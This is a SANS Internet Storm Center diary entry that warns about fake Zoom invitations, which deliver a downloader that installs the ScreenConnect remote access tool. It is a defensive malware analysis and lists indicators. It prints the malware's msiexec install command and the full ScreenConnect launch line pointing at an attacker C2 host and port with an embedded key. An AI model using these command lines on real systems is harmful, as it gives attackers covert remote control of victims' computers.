---
title: Be Careful With Fake Zoom Client Downloads, (Thu, Jun 5th)
url: https://isc.sans.edu/diary/rss/32014
source: SANS Internet Storm Center, InfoCON: green
date: 2025-06-06
fetch_date: 2025-10-06T22:57:58.567084
---

# Be Careful With Fake Zoom Client Downloads, (Thu, Jun 5th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/32010)
* [next](/diary/32016)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Be Careful With Fake Zoom Client Downloads](/forums/diary/Be%2BCareful%2BWith%2BFake%2BZoom%2BClient%2BDownloads/32014/)

**Published**: 2025-06-05. **Last Updated**: 2025-06-05 06:36:36 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/Be%2BCareful%2BWith%2BFake%2BZoom%2BClient%2BDownloads/32014/#comments)

Collaborative tools are really popular these days. Since the COVID-19 pandemic, many people switched to remote work positions and we need to collaborate with our colleagues or customers every day. Tools like Microsoft Teams, Zoom, WebEx, (name your best solution), ... became popular and must be regularly updated.Yesterday, I received an interesting email with a fake Zoom meeting invitation:

![](https://isc.sans.edu/diaryimages/images/20250605-isc-1.png)

When you click on join, you'll visite a website. The HTML page is not malicious but it asks you to install the latest Zoom client:

![](https://isc.sans.edu/diaryimages/images/20250605-isc-2.png)

If you click on the download button, you'll get a nice "gift": an executable called "Session.ClientSetup.exe" (SHA256:f5e467939f8367d084154e1fefc87203e26ec711dbfa83217308e4f2be9d58be).

This malware is very simple and is just a downloader. It dumps on the disk an MSI package:

```

C:\Users\admin\AppData\Local\Temp\ScreenConnect\25.2.4.9229\84cae30d9bf18843\ScreenConnect.ClientSetup.msi
```

Then installs it:

```

"C:\Windows\System32\msiexec.exe" /i "C:\Users\admin\AppData\Local\Temp\ScreenConnect\25.2.4.9229\84cae30d9bf18843\ScreenConnect.ClientSetup.msi"
```

Finally, the newly installed tool is launched and configured (also installed as a service for persistence)

```

"C:\Program Files (x86)\ScreenConnect Client (84cae30d9bf18843)\ScreenConnect.ClientService.exe" "?e=Access&y=Guest&h=tqtw21aa.anondns.net&p=8041&s=6c9715c2-054f-49cc-b888-4084388fc1c5&k=BgIAAACkAABSU0ExAAgAAAEAAQC9dnuqTcFjsgNQridID1kdRpR1VfdwtJjAbZxJ7OqFEjxozVJJ4Fk%2f6wGXUk5FLry2iN4xJDNUkf936O5CbriOKbT5HTkP0KzDmnvehBgv0%2b2%2fHQKELyECMoUtB30UYsSUj%2fyrCMsNLX4BcMNVuQbCBHZX7joQ15PIeSAzEA1ZNI9h8q2Toz7hToU1Rv9kyNBeIoulf9o%2f3FFzBoJYcABIvPgkJu8DHWjJdqR30nYdCT7iJadZIr62PCaEcStVmdD7YDMjizQar9ehuiswtnWKYu9AwCiNiEbNKlW8ymbGR5nI4sfqkAaPoz%2fnP8rmoIeBiy7fzYg3rl7nKjwzPqCw&c=&c=&c=XigRocky&c=&c=&c=&c=&c="
```

ScreenConnect[[1](https://www.screenconnect.com/)] is a well-known remote access tool that will allow the Attacker to access the Victim's computer.

The tools is installed with the following C2 config: tqtw21aa[.]anondns[.]net (151[.]242[.]63[.]139) on port 8041.

[1] <https://www.screenconnect.com/>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Access](/tag.html?tag=Access) [Downloader](/tag.html?tag=Downloader) [Fake](/tag.html?tag=Fake) [Malware](/tag.html?tag=Malware) [RAT](/tag.html?tag=RAT) [Remote](/tag.html?tag=Remote) [Zoom](/tag.html?tag=Zoom)

[0 comment(s)](/diary/Be%2BCareful%2BWith%2BFake%2BZoom%2BClient%2BDownloads/32014/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/32010)
* [next](/diary/32016)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)